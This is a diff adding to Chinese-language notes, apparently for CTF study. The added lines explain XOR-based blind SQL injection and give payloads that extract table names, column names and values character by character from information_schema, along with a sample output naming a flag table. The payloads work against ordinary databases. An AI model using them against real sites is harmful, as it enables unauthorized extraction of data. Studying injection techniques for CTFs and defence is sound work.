@@ -18,3 +18,18 @@ F12查看网络请求情况。
 ^
 ## **sql注入考点**
 部分sql盲注入如逻辑盲注，需要使用代码一个一个字符跑出来。
+
+异或盲注?id=1^1^1
+
+
+
+```
+获取表名
+1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))>0)^1
+[*] F1naI1y,Flaaaaag~
+猜测列名
+1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='表名')),1,1))>0)^1
+猜测值
+1^(ord(substr((select(group_concat(列名))from(表名)),1,1))>0)^1
+```
+
